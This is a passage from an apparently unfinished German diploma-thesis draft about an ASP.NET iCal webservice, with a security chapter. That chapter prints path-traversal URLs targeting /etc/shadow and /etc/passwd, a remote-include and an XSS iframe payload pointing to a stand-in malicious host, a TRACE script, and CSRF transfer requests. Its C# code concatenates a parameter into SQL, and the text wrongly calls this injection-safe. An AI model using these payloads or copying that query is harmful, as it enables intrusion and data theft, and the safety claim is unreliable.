  private string m_Beispiel;
  public string Beispiel
  {
      get => m_Beispiel;
      set => m_Beispiel = value;
  }
\end{lstlisting}

\subsubsection {.NET Framework 4.6}
Am Anfang der Diplomarbeit wurde mit der Firma im Laufe eines Meetings festgelegt, dass bei der Entwicklung des Webservices .net Framework 4.6 verwendet werden soll um die Kompatibilät mit ihren .net Projekten zu garantieren.

Das .NET Framework ist ein Software Entwicklungs-Framework der Firma Microsoft, um Software zu entwicklen, installieren und auszuführen auf Windows basierenden Systemen. 
Aktuell auswählbare Versionen in Visual Studio 2017:\\ 

\centering \includegraphics{Technologien_dotNetVersions}

\justifying
\subsubsection {asp.net}
Da das Ziel der Diplomarbeit ein Webservice unter C\# ist, wurde ASP.NET verwendet. ASP.NET ist Teil des .net Framework, mit ihm lassen sich Webservices oder auch Webanwendungen einfach entwickeln. ASP.NET kommt bei 11.8\% aller aktiven Webseiten zum Einsatz und befindet sich deshalb auf dem 2ten Platz nach der Programmiersprache PHP. 
\url {https://w3techs.com/technologies/overview/programming_language/all} 
% DAS DER LINK SO DRIN IS IS NUR VORÜBERGEHEND DAMIT I MA DIE SEITE "MERK"
\\
Im Anschluss wird durch Screenshots erläutert wie ein ASP.NET Projekt in Visual Studio 2017 erstellt wird.

\begin{figure}[H]
    \centering
    \includegraphics[width=\textwidth]{Technologien_aspNetTutorial01}
    \caption{Projekt erstellen}
    \label{fig:aspNetTut01}

    \centering
    \includegraphics[width=\textwidth]{Technologien_aspNetTutorial02}
    \caption{ASP.NET Webanwendung auswählen}
    \label{fig:aspNetTut02}
\end{figure}
\begin{figure}[H]
    \centering
    \includegraphics[width=\textwidth]{Technologien_aspNetTutorial03}
    \caption{ASP.NET Vorlage auswählen}
    \label{fig:aspNetTut03}

    \centering
    \includegraphics[width=\textwidth]{Technologien_aspNetTutorial04}
    \caption{Resultat}
    \label{fig:aspNetTut04}
\end{figure}

\subsubsection {MSSQL}
MSSQL ist KEIN Teil der finalen Diplomarbeit und wurde nur zu Testzwecken verwendet. Im Laufe der Entwicklung wurde von Teammitglied Matthias Franz und Marcel Stering ein Raspberry PI als Datenbank aufgesetzt um einige Tests durchzuführen. Dies wurde mit Microsoft SQL Server verwirklicht. 
\subsubsection {Microsoft SQL Server management Studios}
Bei der Microsoft SQL Server entwicklung kam Microsoft SQL Server management Studios zum Einsatz, die Aufgabe des Management Studios war es den Server zu konfigurieren und zu verwalten. 
\subsubsection {Entity Framework}
Das Entity Framework ist ein Großteil des Projektparts "Parser" gewesen. Das Entity Framework wird angewandt um den Zugriff auf die Datenbank zu erleichtern. Es dient zur objektrationalen Abbildung auf .NET Objektstrukturen. Auf die Funktionsweise des EFs wird im Parser genauer eingegangen.

\subsubsection {iCal}
iCal ist das Format in dem ein Kalender gespeichert wird. Das Format wird unter einer eigenen Überschrift im Laufe der schriftlichen Arbeit genauer erklärt. 
Ein Beispiel für den Aufbau des iCal-Formats sieht wie folgt aus: \break 
\begin{flushleft}
BEGIN:VCALENDAR \break
VERSION:2.0 \break
PRODID:http://www.example.com/calendarapplication/ \break
METHOD:PUBLISH \break
BEGIN:VEVENT \break
UID:461092315540@example.com \break
ORGANIZER;CN=``Alice Balder, Example Inc.'' :MAILTO:alice@example.com \break
LOCATION:Irgendwo \break
GEO:48.85299;2.36885 \break
SUMMARY:Eine Kurzinfo \break
DESCRIPTION:Beschreibung des Termines \break
CLASS:PUBLIC \break
DTSTART:20060910T220000Z \break
DTEND:20060919T215900Z \break
DTSTAMP:20060812T125900Z \break
END:VEVENT \break
END:VCALENDAR \break
\end{flushleft}
% WIRD VERÄNDERT WEIL DES MOMENTAN 1 ZU 1 WIKIPEDIA IS
\justifying
\subsubsection {ReSharper}
ReSharper ist eine von JetBrains produzierte Erweiterung für Visual Studio, welche das Entwickeln im .NET Bereich erleichtert. Die tschechische Firma JetBrains ist unter anderem Herausgeber von PyCharm, IntelliJ IDEA,  CLion und vielen weiteren hilfreichen Entwicklungs-Tools.

\paragraph {Resharper Installation}
1. ReSharper auf der JetBrains Seite unter folgendem Link herunterladen: \break \url {https://www.jetbrains.com/resharper/download/} \\
2. Nach Download, die .exe Datei ausführen \\
3. Installierte Visual Studio Version auswählen, License Agreement akzeptieren, anschließend bei gewolltem Paket auf "Install" klicken und auf "Next". 
Wenn man nun auf "Next" geklickt hat werden alle zu installierenden Pakete nochmal angezeigt. Falls die Auswahl passt, auf "Install" klicken. \\
4. Wenn die Installation abgeschlossen ist Fenster schließen. \\
5. Um sicherzugehen, dass die Installation erfolgt ist, Visual Studio starten. Hier sollte nun ein Fenster aufploppen um das Shortcut Sheme auszuwählen.
Wählt man nun eines der Möglichkeiten aus und klickt sich durch Agreements sollte anschließend eine License Information zu sehen sein. Hier beim Paket auf ''Start Evaluation'' klicken und anschließend auf ''OK'' drücken und ReShaper ist funktionsfähig und läuft.

\subsubsection {PostMan}


\subsection{Kommunikation}
\subsubsection {Discord}
Um im Laufe des praktischen Teils der Diplomarbeit die Übersicht zu behalten und alles zu organisieren wurde Discord verwendet. Discord hat viele Funktionen welche die Kommunikation im Team erleichtern. Discord bietet dem Benutzer an einen oder mehrere gratis Server zu erstellen. Ein Server kann aus Text und Sprachchannels bestehen. In einem Textchannel können festgelegte Personen schreiben und in einem Sprachchannel über Mikrofon miteinander reden. Falls wir also Teamintern etwas zu besprechen hatten oder falls Probleme auftraten die wir selbst lösen konnten bat Discord die perfekte Kommunikationsfläche. 

Da wir als Gruppe mehrere Projekte haben haben wir einen "Projektserver". In diesem Projektserver haben wir einen Text und Sprach Channel für die Diplomarbeit. Im Text Channel werden kleine Probleme, die schnell geklärt werden können, besprochen und Files ausgetauscht. Im Sprach Channel werden gröbere Probleme besprochen oder wenn nötig Planänderungen. 

%Installation und Server erstellung

\subsubsection {Telegram}
Telegram wurde nicht regelmäßig verwendet, es war eher eine Backup Chat-Application. 

\subsection{File Sharing}
\subsubsection {TFS}
Der Microsoft Team Foundation Server ist die verwendete Code-Sharing Technologie. Da der Auftraggeber, die Firma Intact GmbH oder Intact Systems, mit dieser Technologie arbeitet haben wir bei einem der ersten Treffer TFS für Code Sharing gewählt. Wir hatten einige Probleme mit dem TFS wodurch oft einzelne Teile des Projekts entwickelt wurden und dann in ein Projekt zusammengeführt wurden. Die Probleme waren unter anderem, dass die Firma eine Zeit lang gebraucht hat um den Server zur Verfügung zustellen aber auch, dass das Verbinden mit dem Server manchmal nicht geklappt hat. 

%Anleitung wie man einen TFS benutzt

\subsubsection {Discord}
Wie bereits bei den Technologien erwähnt haben wir auf einem Discord Server einen Text Channel eingerichtet. Dieser eignet sich nicht nur um miteinander zu schreiben sondern kann auch dafür genutzt werden mit anderen Benutzer Files zu teilen. 
\subsubsection {Google Drive}
Google Drive ist ein von Google bereitgestellter Cloud Service um Dokumente freizugeben, Online zu bearbeiten und zu speichern.

Mithilfe von Google Drive wurde an Präsentationen und Projekten gearbeitet. Durch Google Docs und Google Präsentation fällt es leicht mit mehreren Personen gleichzeitig an einem Dokument zu arbeiten. Durch Google Drive wurden Dokumente wie die IVM Matrix, den Projektstrukturplan, die Meetings und die SCRUM Sprints erstellt und an alle Mitglieder geteilt. 
\subsection{Organisation}
\subsubsection {Trello}
Trello ist eine web-basiert Software die das managen von Projekten vereinfacht. Trello wurde benutzt um den management Prozess Scrum erfolgreich durchzuführen. Trello bietet eine gute Übersicht über den Status des Projekts, da es Aufgaben in Form von kleinen Karten in einer Liste anzeigt. Diese Aufgaben kann man mit einer Verantwortlichen Person inkl. Frist versehen. So wird dem Scrummaster die Möglichkeit geboten 3 Listen zu erstellen: ''To Do'', ''in Arbeit'' und ''Fertig''. Je nachdem in welchem Status sich die Aufgabe befindet wird sie dementsprechend zugeteilt.

\subsection{Schriftliche Arbeit}
\subsubsection {LaTeX}
LaTeX ist ein System mitdessen Hilfe man ein Dokument erstellen kann. Die Formatierung dieses Dokuments läuft anders als bei Word über Befehle. LaTeX läuft über das Textsatzsystem TeX. TeX hat seine eigene Sprache um Formatierungen von Text oder Grafiken sehr präzise und individuell einzustellen. 
\paragraph{Warum LaTeX?}
Warum wurde LaTeX verwendet und nicht Word oder sonstige Programme? Sobald bei einem Dokument vorgeschriebene Formatierung einzuhalten ist oder es einen großen Umfang haben wird, lohnt es sich LaTeX zu verwenden. Mit LaTeX werden Formatierung per Befehl definiert, man kann am Anfang des Dokuments gewisse Vorgaben definieren so kann man Standardmäßige Einstellungen vornehmen welche Formatierungsfehler beinahe komplett ausschließen. Nicht nur die Formatierung wird übersichtlicher und erleichtert, auch die Aufteilung des Projekts wird simpler. Es ist möglich ein Dokument als ''Haupt''-Dokument anzulegen und in diesem weitere einzelne Dokumente einzubinden. So kann man verschieden Themenbereiche in verschiedene Dokumente aufteilen. \cite{TechnologieLaTeX} %WIESO ZITIERTS DES NET SO WIE BEIM FRANZ?!
\pagebreak
	\renewcommand{\theauthor}{Marcel Stering}
\chapter{Webseite}
\label{sec:Webseite}
\section{Webseite-Security}
\label{sec:Security}
In diesem Abschnitt beschäftigen wir uns mit der Security der Webseite.
Wir behandeln wie man das sichere einloggen in eine Webseite gewähren kann, 
wie man sich vor XSS/CSRF schützen kann, wie man verhindert das eine SQL Injection
möglich ist und wie man Passwörter speichert. Dazu werden wir einige Code Beispiele anführen.

\subsection{Login Handling}
\label{sec:Login}
\subsection{Two-Factor-Auth}
\label{sec:tfa}
\subsubsection{Was ist Two-Factor Authentication}
Die Zweifaktorauthentifizierung (2FA) ist eine Art der Multi-Faktor-Authentifizierung. Es ist eine Methode, mit der der Benutzer über zwei verschiedene Faktoren seine Identität bestätigen kann.\\ \\
Die dabei geltenden Faktoren lauten:
\begin{enumerate}
\item etwas, das sie wissen
\item etwas, das sie haben
\item etwas, das sie sind
\end{enumerate}
Ein gutes Beispiel für die Zweifaktorauthentifizierung ist die Behebung von Geld an einem Geldautomaten. Nur die korrekte Kombination einer Bankkarte (die der Benutzer besitzt) und einer PIN (die der Benutzer weiß) ermöglicht die Durchführung der Transaktion.\\ \\Als neueres Beispiel könnte man das Anmelden von seinem Google Account nehmen, wo man sein Passwort wissen muss und mit seinem Handy bestätigen, das man sich einloggen will, also etwas das man weiß und etwas was man hat. 

(wikipedia)
\subsection{Path-Traversal}
\label{sec:Path-Traversal}
Als Path-Traversal wird eine Security Lüge bezeichnet die es einem Angreifer, durch Manipulation des URLs auf Daten zuzugreifen, auf die er nicht zugriffen können sollte. 
\subsubsection{Grundprinzip}
Man sollte nicht auf Dateien, die sich außerhalb vom Web-Directory befinden, von einem Webserver zugreifen können. Beim Path-Traversal versucht man als Angreifer durch beifügen von Pfadangaben das Verzeichnis zum Root-Verzeichnis zu wechseln. 
//
Man benutzt ../ als Parameter zum Wechseln des Verzeichnisses.
\subsubsection{Beispiele}
\begin{enumerate}
\item Windows
\begin{enumerate}
\item \url{http://www.example.com/index.foo?item=../../../Config.sys}
\item \url{http://www.example.com/index.foo?item=../../../Windows/System32/cmd.exe?/C+dir+C:}
\end{enumerate}
\item Linux
\begin{enumerate}
\item \url{http://some_site.com.br/../../../../etc/shadow }
\item \url{http://some_site.com.br/get-files?file=/etc/passwd}
\end{enumerate}
\end{enumerate}
Anhand dieser Beispiele kann man sehen, das einem diese Schwäche ermöglicht lokale Passwörter auszulesen und Windows Configs.  
\\ \\
Unter Linux ist diese Schwäche kritischer da man hier auf die komplette Festplatte Zugriff bekommt. In Windows kann man sich nur im lokalen Directory bewegen, wo sich die Website befindet.
\\ \\
Eine weitere Anwendungsmöglichkeit ist es auf seine eigene bösartige Seite zu verweisen und über diese code einzufügen mit dem man sich noch mehr Möglichkeiten verschafft. \\ \\
\url{http://some_site.com.br/some-page?page=http://BoeseSeite.com.br/other-page.htm/malicius-code.php}
\subsubsection{Protection Path-Traversal}
\subsection{XSS Protection}
\label{sec:xss}
\subsubsection{Allgemeines über XSS}
XSS steht für Cross-Site-Scripting und ist eine Security schwäche, welche es ausnutzt das eine Webadmin nicht davon ausgeht das eine gewisse Eingabe getätigt wird. Meist nutzt ein Hacker diese Schwäche um einen bösartigen Code auszuführen, zu Beispielen werden wir später noch kommen. Trotz dem hohen Bekanntheitsgrad von XSS und findet man Cross-Site-Scripting immer noch aus der OWASP Top 10, welche die häufigsten Security Vulnerabilities Jahr für Jahr auflistet. Bei dem ausnutzen von XSS greift man sein 'Opfer' nicht direkt an, sondern man nutzt diese Schwachstelle, um bspw. ein bösartiges Skript zu platzieren, welches dann von einem nichts ahnenden User aufgerufen wird. 
\subsubsection{XSS Targets:}
\begin{enumerate}
\item Javascript (wobei Javascript das beliebteste ist) 
\item VBScript 
\item ActiveX
\item Flash
\end{enumerate}
\subsubsection{Warum ist Javascript so beliebt?}
Der Grund hierfür ist das Javascript quasi eine fundamentale Einheit einer Webseite ist. Man wird kaum eine Webseite finden, welche kein Javascript verwendet.
\subsubsection{Beliebte Angriffsvektoren}
\begin{enumerate}
\item Session Hijacking
\item Website-Defacements 
\item Phishing
\end{enumerate}
\subsubsection{Session Hijacking}
Beim Session Hijacking werden, wie es einem der Name schon verrät, Sessions von Webseiten übernommen. Meist bemerkt ein User gar nicht das seine Session von einem Angreifer übernommen worden ist. Das Hauptziel ist dabei das überwachen von Aktivitäten bzw. Datendiebstahl. Sehr problematisch wird es, wenn eine Admin Session zugänglich wird und der Angreifer so auf einen Admin Account zugreifen kann. Bei so einem Vorfall hat der Angreifer dann alle Rechte und kann sich so zusagen austoben, wie er will. Und hier reicht schon eine kleine XSS Vulnerability aus um dies zu bewerkstelligen. 
\subsubsection{Website-Defacements}
Website-Defacements hat etwas von digitalem Graffiti. Hier wird XSS genutzt um sich den Zugriff auf die Webseite zu verschaffen und sie dann optisch zu verändern. 
\subsubsection{Phishing}
Im Prinzip ist Phishing die Intention mit Fake Webseiten oder Emails an vertrauliche Daten eines Users zu kommen. Ein Beispiel wäre mit einem gefälschten Facebook Login an die Login Daten eines Benutzers zu kommen. 
\\ \\Doch wie hängt das mit XSS zusammen?\\ \\Bei einer Url hat man sehr oft eine Abfragezeichenfolge. Diese werden benutzt um beliebige Werte zu übergeben. Beispielweise würde die Url 
\url{ http://www.Sehr-Sichere-Webseite.com/program?value} den Parameter value and das Programm schicken.Und hier kommt Cross-Site-Scripting ins Spiel und man könnte wieder etwas bösartiges übergeben.\\ \\Ein Angreifer könnte jetzt diese Schwäche ausnutzen um zu eine anderen Website weiterzuleiten und selbst noch etwas hinzufügen, beispielsweise der Abfrage von Login Daten. \\ \\Beispiel\\ \\
\url{"http://www.EineFinanzseite.com/?q=
%3Cscript%3Edocument.write%28%22%3Ciframe+src%3D%27
http%3A%2F%2Fwww.BoeseSeite.com%27+
FRAMEBORDER%3D%270%27+WIDTH%3D%27800%27+HEIGHT%3D%27640%27
+scrolling%3D%27auto%27%3E%3C%2Fiframe%3E%22%29%3C%2Fscript%3E&...=...&... "}
\\ \\
Wobei die Modulo Buchstaben in Hexadezimal folgendes darstellen
\\ 3C : <
\\ 3E : >
\\ 28 : (
\\ 22 : "
\\ 3D : =
\\ 27 : '
\\ 3A : :
\\ 2F : /
\\ 29 : )\\ \\
Es ergibt sich daraus \\ \\
\url{http://www.EineFinanzseite.com/?q=<script>document.write("<iframe src='http://www.BoeseSeite.com' FRAMEBORDER='0' WIDTH='800' HEIGHT='640' scrolling='auto'></iframe>")</script>&...=...&...">}
\\ \\Beim Ausführen wird dann HTML Code eingefügt 
\\ \\
<iframe src='http://www.BoeseSeite.com' FRAMEBORDER='0' WIDTH='800' HEIGHT='640' scrolling='auto'></iframe>
\\ \\
Diese IFrame beinhaltet jetzt Code von der Bösen Seite und ermöglicht dem Angreifen eingegebene Daten vom User zu sehen. 
\subsubsection{Cross-Site-Tracing XST}
Beim Cross-Site-Tracing wird XSS und die HTTP-Methoden TRACE oder Track verwendet. TRACE ermöglicht dem Client, zu sehen, was am anderen Ende der Anforderungskette empfangen wird, und diese Daten für Test- oder Diagnoseinformationen zu verwenden.Die TRACK-Methode funktioniert auf gleich, ist jedoch spezifisch für IIS von Microsoft. Cross-Site-Tracing kann als Methode zum Stehlen von User-Cookies über Cross-Site-Scripting verwendet werden, auch wenn für das Cookie das Kennzeichen "HttpOnly" gesetzt ist und / oder der Autorisierungsheader des Benutzers verfügbar gemacht wird.
\\ \\
Obwohl die TRACE-Methode scheinbar harmlos ist, kann sie in einigen Szenarien erfolgreich eingesetzt werden, um die Berechtigungsnachweise legitimer Benutzer zu stehlen. Diese Angriffsmethode wurde 2003 von Jeremiah Grossman entdeckt, um den HttpOnly-Tag zu umgehen, den Microsoft in Internet Explorer 6 sp1 eingeführt hat, um Cookies vor dem Zugriff durch JavaScript zu schützen. Tatsächlich besteht eines der am häufigsten auftretenden Angriffsmuster in Cross Site Scripting darin, auf das document.cookie -Objekt zuzugreifen und es an einen vom Angreifer kontrollierten Webserver zu senden, damit er / sie die Sitzung des Opfers entführen kann. Das Markieren eines Cookies, da HttpOnly JavaScript den Zugriff auf das Cookie verbietet und es vor dem Senden an Dritte schützt. Die TRACE-Methode kann jedoch verwendet werden, um diesen Schutz zu umgehen und auf das Cookie selbst in diesem Szenario zuzugreifen.
\\ \\
Modernere Browser verhindern das TRACE über JavaScript gesendet werden kann.
\subsubsection{Beispiel}
\begin{lstlisting}
<script>
  var xmlhttp = new XMLHttpRequest();
  var url = 'http://127.0.0.1/';

  xmlhttp.withCredentials = true; // send cookie header
  xmlhttp.open('TRACE', url, false);
  xmlhttp.send();
</script>
\end{lstlisting}
\subsubsection{Wie gewährleisten wir XSS Protection}
Die Webseite beschränkt sich generell auf wenige Eingabe fenster wo eine Standard XSS versucht werden könnte. Alle diese Eingaben erlauben keine Tags oder Sonderzeichen. Auch Url Parameter können nie direkt gesendet werden und somit fällt auch der URL Faktor weg.
\\ \\
Alle Möglichen Eingabefelder
\\ \\
\includegraphics[width=\textwidth]{Webseite_XSS_img1}
\includegraphics[width=\textwidth]{Webseite_XSS_img2}
\includegraphics[width=\textwidth]{Webseite_XSS_img3}
\\ \\
In den URLS werden durch MVC und passende Implementierung nie Parameter gesendet bei denen man XSS Code einfügen könnte.\\ \\
Dadurch hat unsere Webseite eine Funktionierende XSS Protection

\subsection{XSRF/CSRF Protection}
\label{sec:csrf}
\subsubsection{Was ist XSRF/CSRF}
CSRF steht für Cross-Site Request Forgery. CSRF ist ein Angriff, bei dem das Opfer dazu gebracht wird, eine böswillige Anfrage zu übermitteln. Als Angreifer erbt man dabei die Identität und die Privilegien des Opfers und kann beispielsweise eine unerwünschte Funktion im Namen des Opfers ausführen. Bei den meisten Websites enthalten Browser-Anforderungen automatisch alle mit der Website verknüpften Anmeldeinformationen, z. B. Sitzungscookies des Benutzers, IP-Adresse, Anmeldeinformationen der Windows-Domäne usw. Wenn der Benutzer derzeit für die Seite authentifiziert ist, hat die Seite keine Möglichkeit, zwischen der vom Opfer gesendeten gefälschten Anfrage und einer vom Opfer gesendeten legitimen Anfrage zu unterscheiden.
\\ \\
Eine CSRF zielt oft darauf Daten zu Ändern. Beispielsweise das Kennwort und die Email eines Kontos oder das Kaufen eines Gegenstands.   der Angreifer erhält keine Antwort , sondern das Opfer. CSRF-Angriffe zielen daher auf Zustandsänderungsanforderungen ab.
\\ \\
Es ist manchmal möglich, den CSRF-Angriff auf der verwundbaren Seite selbst zu speichern. Das kann durch einfaches Speichern eines IMG- oder IFRAME-Tags in einem HTML-fähigen Feld oder durch einen komplexeren Cross-Site-Scripting-Angriff erreicht werden. Wenn der Angriff einen CSRF-Angriff in der Seite speichern kann, wird der Schweregrad des Angriffs erhöht. 

\subsubsection{Wie Funktioniert eine Solche Attacke}
Man baut sich eine bösartige URL oder ein bösartiges Skript und bringt das Opfer dazu den URL aufzurufen. 
\\ \\
Beispiel
\begin{lstlisting}
GET http://bank.com/transfer.do?acct=Angreiger&amount=1000 HTTP/1.1
\end{lstlisting}
Oder
\begin{lstlisting}
<a href="http://bank.com/transfer.do?acct=MARIA&amount=100000">View my Pictures!</a>
\end{lstlisting}
Auch eine Post Request ist möglich
\\ \\
\begin{lstlisting}
POST http://bank.com/transfer.do HTTP/1.1
acct=Angreifer&amount=1000
\end{lstlisting}
\subsubsection{Verhindern}
\url{https://docs.microsoft.com/en-us/aspnet/core/security/anti-request-forgery?view=aspnetcore-2.2}
\subsection{Hashes}
\label{hash-expl}
Wir beginnen die Erklärung von HASHes mit einem Beispiel.
\\ \\
Sagen wir, wir wollen ein File von einem Computer zu einem anderen Computer schicken und es ist sehr wichtig das wir feststellen können, das es nicht verändert wurde. Um das zu gewährleisten, gibt es HASH Algorithmen. Ein HASH ist eine Einwegfunktion, heißt man kann einen HASH für ein File berechnen aber nicht aus dem HASH das File holen. 

Drei Sachen sind bei einem HASH Algorithmus wichtig.
\begin{enumerate}
\item Geschwindigkeit
\item Ändert man ein 1-bit sollte der gesamte HASH anders sein
\item HASH Kollisionen verhindern 
\end{enumerate}

\subsubsection{HASH Kollisionen}

Sagen wir, wir haben ein wichtiges Dokument, das wir der Leitung in der IT schicken. Mit dem Dokument kommt der HASH damit die IT verifizieren kann das jenes Dokument auch das richtige ist. Ist es jetzt dem Hacker möglich das File zu bekommen und zu verändern, würde der HASH ein anderer sein. Ist der HASH algorithmus aber nicht richtig implementiert und somit nicht funktionsfähig ist, es möglich für das File den originalen HASH festzulegen.
\\ \\
Beispiele
\begin{enumerate}
\item MD5
\item SHA1
\end{enumerate}
Der Faktor Schnelligkeit ist sehr relevant, ist der Algorithmus zu langsam will ihn keiner nutzen, ist er aber zu schnell kann man recht einfach Dokument erstellen welches zwar anders ist aber den selben HASH als das Orginal hat.
\subsection{Wie funktioniert ein HASH Algorithmus}
Wie ein HASH Algorithmus grundsätzlich arbeitet werde ich anhand von SHA-256 erklären. 
\subsubsection{Allgemeines über SHA256}
SHA256(secure hash algorithm) ist ein kryptografischer HASH mit eine Zeichenlänge von 256 bits. Es ist eine Schlüssellose HASH-Funktion.
\\ \\
Eine Nachricht wird in jeweils 512 Blöcken (16 * 32 Bits) abgearbeitet und jeder block benötigt 64 Runden.
\subsubsection{Der Algorithmus}
Basis Operationen
\begin{enumerate}
\item Boolesche Operationen
\begin{enumerate}
\item AND
\item XOR
\item OR
\end{enumerate}
\item Bitweises Komplement
\item Integer-Addition Modulo $2^{32}$, bezeichnet mit A + B.
\end{enumerate}
Jede dieser Operationen arbeitet mit 32 Bit. Bei der letzten Operation wird diese von Binär in Integer übersetzt und in Dezimal Basis geschrieben.\\ \\
Wobei
\begin{enumerate}
\item RotR (A, n) bezeichnet die zirkulare Verschiebung von n Bits des Binärworts A nach rechts
\item ShR (A, n) bezeichnet die Rechtsverschiebung von n Bits des Binärworts A
\item AkB bezeichnet die Verkettung der Binärwörter A und B
\end{enumerate}
SHA256 benutzt folgende Funktionen\\
\includegraphics[width=300px,height=200px]{Website_SHA256_Functions}
\subsubsection{Das Padding}
Das Padding stellt sicher, dass die Nachricht ein Vielfaches von 512 Bits ist dafür wird folgendes getan.
\begin{enumerate}
\item Zuerst wird ein Bit 1 angehängt,
\item Als nächstes werden k Bits 0 angehängt, wobei k die kleinste positive ganze Zahl ist, so dass l + 1 + k $<=$ 448 ist
mod 512, wobei l die Länge der ursprünglichen Nachricht in Bits ist
\item Schließlich wird die Länge l < $2^{64}$ der ursprünglichen Nachricht mit genau 64 Bits und diesen Bits dargestellt
werden am Ende der Nachricht hinzugefügt
\end{enumerate}
Die Nachricht wird immer aufgefüllt, auch wenn die Anfangslänge bereits ein Vielfaches von 512 ist.
\subsubsection{Block decomposition}
Für jeden Block M $\in$ {0, 1} 512 , 64 Wörter aus 32 Bits wird folgendermaßem vorgegangen. 

\begin{enumerate}
\item Die ersten 16 werden durch Aufteilen von M in 32-Bit-Blöcke erhalten
\item Die restlichen 48 werden durch folgende Formel erhalten.
\end{enumerate}
Formel 1:
\\ \\
\includegraphics[width=150px,height=30px]{Webseite_SHA256_f1}
\\ \\Formel 2:\\ \\
\includegraphics[width=280px ,height=30px]{Webseite_SHA256_f2}
\\ \\
(was passiert hier)
\subsection{Password Hashes}
\label{sec:hash}
Wie die Wahl eines sicheren Passsworts vom Benutzer, ist es genau so wichtig für den Service Provider, dass dieser das Passwort seiner User hasht.

\section{ASP.NET MVC}
\label{sec:MVC}
In diesem Abschnitt beschäftigen wir uns mit ASP.NET MVC mit der unsere Webseite aufgebaut ist. Wir besprechen die Grundindention von MVC und was MVC ist. Wie die Webseite aufgebaut wurde werden wir anhand Code auszügen zeigen. Die beim MVC bekannten Views Controllers und Services werden aufgezeigt und erklärt. Ebenfalls wird behandelt wie die Links zu den Kalendern erzeugt und zur Verfügung gestellt werden. 

\subsection{Allgemeines MVC}
\label{sec:allgemein}
\subsection{Erstellung der Webseite}
Dieses Kapitel befässt sich damit wie man in Visual-Studio ein MVC-Website Projekt erstellen kann.\\ \\
Zunächst muss man sicherstellen das man alle benötigten Features installiert hat. Dafür geht man auf Datei -> Neues Projekt und klickt dann auf folgendes.\\
\includegraphics[width=\textwidth]{Webseite_MVC_Erstellung_features}
Im Installer überprüft man dann ob man folgende Features installiert hat.\\
\includegraphics[width=\textwidth]{Webseite_MVC_Erstellung_Install}
Danach kann man ein MVC-Website Projekt erstellen dafür mach man folgendes.\\ \\
Schritt 1:\\
Zuerst müssen wir über File -> New -> Project, die Erstellung eines neuen Projekts einleiten.\\ \\
\includegraphics[width=\textwidth]{Webseite_MVC_Erstellung_Schritt1}
Schritt 2:\\
Danach müssen wir unter dem Tab Web die ASP.NET Core Web Application wählen und ihr einen Namen zuweisen. Danach klicken wir auf Ok.\\ \\
\includegraphics[width=\textwidth]{Webseite_MVC_Erstellung_Schritt2}
Schritt 3:\\
Nun muss das Modell gewählt werden, hier wählen wir die MVC Web-Application. Danach klicken wir auf Change Authentication. \\ \\
\includegraphics[width=\textwidth]{Webseite_MVC_Erstellung_Schritt3}
Schritt 4:\\
In diesem Schritt müssen wir festlegen, das unsere Web-Anwendung User Daten speichert. \\ \\
\includegraphics[width=\textwidth]{Webseite_MVC_Erstellung_Schritt4}
Danach hat man erfolgreich eine MVC-Website erstellt und kann diese über IIS Express Lokal starten und testen. Macht man das ganze sieht man das ASP Template.
\includegraphics[width=\textwidth]{Webseite_MVC_Erstellung_Done}
\includegraphics[width=\textwidth]{Webseite_MVC_Erstellung_Preview}
\label{sec:erstellung}
\subsection{Aufbau der Webseite }
\label{sec:aufbau}
In diesem Kapitel beschäftigen wir unser damit wie die Webseite aufgebaut ist. Dazu folgen nun einige Screenshots der Webseite. 

Zunächst kommen wir auf die Hauptseite\\ \\
\includegraphics[width=\textwidth]{Webseite_MVC_Aufbau_Main}
Auf dieser kann man sich dann entweder Einloggen oder Registrieren. \\ \\
\includegraphics[width=\textwidth]{Webseite_MVC_Aufbau_Register}
\includegraphics[width=\textwidth]{Webseite_MVC_Aufbau_login}
Hat man sein Passwort vergessen kann man dieses über das Passwort vergessen Feature zurücksetzen. \\ \\
\includegraphics[width=\textwidth]{Webseite_MVC_Aufbau_PasswordReset}
Ist man eingeloggt kann man seinen Account verwalten.\\ \\
\includegraphics[width=\textwidth]{Webseite_MVC_Aufbau_User1}
Man kann sein Passwort ändern oder sein 2FA einrichten. \\ \\
\includegraphics[width=\textwidth]{Webseite_MVC_Aufbau_password}
\includegraphics[width=\textwidth]{Webseite_MVC_Aufbau_2FA}
Und natürlich gibt es hier das Hauptfeature, nämlich das verwalten der Kalender, bzw. das Abrufen der Links oder das direkt herunterladen.\\ \\
 \includegraphics[width=\textwidth]{Webseite_MVC_Aufbau_calendars}
\subsection{Link generation}
\label{sec:link}
Hier wird das Herz des ICAL-Webservices erklärt. Nämlich die Funktion die der/die fertigen Kalender zur Verfügung stellt.
\begin{lstlisting}
public List<string> getUsersTables(string myuser)
{
        //List fuer UserIDs
        List<int> result = new List<int>();
        //Verbindung zu Datenbank
        using (SqlConnection connection = new SqlConnection(@"dbstring"))
        {
            connection.Open();
            //Abfragen und holen der UserID fuer den Parser
            using (SqlCommand command = new SqlCommand("SELECT userid FROM UserTable WHERE Email = '" + myuser + "'", connection))
            {
                command.CommandType = CommandType.Text;
                using (SqlDataReader reader = command.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        result.Add(reader.GetInt32(0));
                    }

                    reader.Close();
                }
                command.Cancel();
            }
        }
    //Erstellen der Liste fuer die Kalender
    List<string> tables = new List<string>();
    string icals = "";
    //Aufrufen des Parsers und speichern der Daten
    result.ForEach(x => icals += new Parser().GetICalFormat(x));
    //Spliten nach den Kalendern und Files zurueckliefern
    icals.Split("XCALSPLITX").ToList().ForEach(x => { if (x != "") tables.Add(x); });
    return tables;
}
\end{lstlisting}
Bei dem Benutztem SQL Statement könnt man denken das eine SQL-Injection Möglich wäre, ist es aber nicht da hier der übergebene String nicht von der Eingabe des Users abhängt sondern fix im Programm ist.
\subsection{Controller}
\label{sec:Controller}
\subsection{Views}
\label{sec:Views}
\subsection{Services}
\label{sec:Services}
\subsection{User Datenbank}
\label{sec:UserDB}
\begin{itemize}
	\item Salt
\end{itemize}
\label{sec:salt}

	\input{./Tests/Tests.tex}
	

\printbibliography  
\listoffigures


\end{document}

